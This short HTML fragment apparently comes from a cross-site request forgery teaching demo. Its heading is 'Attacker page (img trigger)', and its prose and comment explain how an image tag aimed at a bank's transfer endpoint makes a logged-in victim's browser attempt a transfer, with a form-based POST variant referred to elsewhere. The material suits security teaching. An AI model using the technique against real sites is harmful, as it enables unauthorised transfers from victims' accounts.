    <h2>Attacker page (img trigger)</h2>
    <p>
      This page contains an image tag whose `src` is the bank's transfer
      endpoint. If the user's browser includes the bank session cookie, the
      browser will request this URL and the transfer will be attempted.
    </p>

    <!-- Browser will make a GET to the transfer endpoint with query params.
         Note: The vulnerable server above expects POST; however many real-world apps accept GET or a state-changing GET (bad).
         To make it submit a POST automatically, see attacker-form.html below that auto-submits a form. -->
